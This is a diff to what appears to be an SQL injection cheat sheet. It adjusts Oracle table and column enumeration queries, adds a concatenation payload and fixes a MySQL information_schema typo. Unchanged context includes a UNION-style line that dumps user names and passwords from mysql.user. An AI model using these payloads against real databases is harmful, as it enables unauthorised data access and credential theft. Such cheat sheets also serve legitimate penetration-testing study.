@@ -66,8 +66,9 @@ SELECT BANNER FROM v$version --> Oracle
 
 ```sql
 --- ORACLE (no information schema)
-SELECT * FROM all_tables
-SELECT * FROM all_tab_columns WHERE table_name = '<table-name>'
+SELECT table_name FROM all_tables
+SELECT table_name FROM all_tab_columns WHERE table_name = '<table-name>'
+SELECT <colum1> || ':' || <column2> from <table_name>
 
 --- PostgreSQL
 SELECT * FROM information_schema.tables
@@ -83,7 +84,7 @@ SELECT * FROM information_schema.columns WHERE table_name = '<table-name>'
 
 
 SELECT schema_name from information_schema.schemata
-SELECT table_name from information_schema.table where table_schema='foo' --
+SELECT table_name from information_schema.tables where table_schema='foo' --
 SELECT column_name from information_schema.columns where table_schema='foo' and table_name='bar' -- 
 SELECT 1,group_concat(User,0x3a,Password),3 from mysql.user --
 
